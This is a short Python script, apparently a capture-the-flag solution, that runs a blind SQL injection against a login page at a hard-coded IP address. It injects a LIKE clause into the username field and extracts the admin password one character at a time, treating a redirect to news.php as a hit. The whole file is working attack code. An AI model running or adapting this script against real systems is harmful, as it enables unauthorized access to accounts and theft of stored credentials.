import requests
import string
a="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&'()*+,-./:;<=>?@[\]^`{|}~     _"
url='http://45.122.249.68:20017/login.php'
c=""
print(a)
while(True):
    for i in a:
        data={
            "username":"admin'and password like '"+c+i+"%'-- -",
            "password":"aaaaaaaaa"
        }
        r=requests.post(url,data=data)
        if(r.url=="http://45.122.249.68:20017/news.php"):
            c+=i
            print(c)
            break
